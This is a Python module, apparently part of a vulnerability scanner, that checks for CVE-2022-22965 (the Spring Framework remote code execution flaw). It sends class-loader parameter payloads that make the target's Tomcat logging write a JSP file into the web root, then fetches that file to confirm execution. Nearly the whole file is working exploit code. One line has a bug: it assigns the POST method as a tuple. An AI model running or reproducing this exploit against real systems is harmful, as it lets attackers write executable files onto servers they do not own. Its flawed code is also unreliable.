#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from time import sleep

randomFileName = random_md5()
randomStr = random_md5()

cve_2022_22965_payloads = [
    {
        'path-1': '?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{RCEMD}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={FILENAME}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format(RCEMD=randomStr, FILENAME=randomFileName),
        'data-1': '',
        'path-2': '{FILENAME}.jsp'.format(FILENAME=randomFileName)
    },
    {
        'path-1': '',
        'data-1': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{RCEMD}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={FILENAME}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format(RCEMD=randomStr, FILENAME=randomFileName),
        'path-2': '{FILENAME}.jsp'.format(FILENAME=randomFileName)
    }
]

def cve_2022_22965_scan(clients):
    ''' Spring Framework 远程代码执行漏洞(Spring core RCE) '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Spring',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2022-22965',
    }

    headers = {
        'suffix': '%>//',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1'
    }

    for payload in cve_2022_22965_payloads: # * Payload
        path_1 = payload['path-1']          # * Path-1
        data_1 = payload['data-1']          # * Data-1
        path_2 = payload['path-2']          # * Path-2

        if data_1:
            method = 'POST',
        else:
            method = 'GET'
        
        res1 = client.request(
            method,
            path_1,
            data=data_1,
            headers=headers, 
            vul_info=vul_info
        )
        if res1 is None:
            continue
        
        for i in range(3):
            sleep(2.5)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
            
            res2 = client.request(
                'get',
                path_2,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            if ((res2.status_code == 200) and (randomStr in res2.text)):
                results = {
                    'Target': res1.request.url,
                    'Verify': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res1,
                    'Request-2': res2,
                }
                return results
    return None
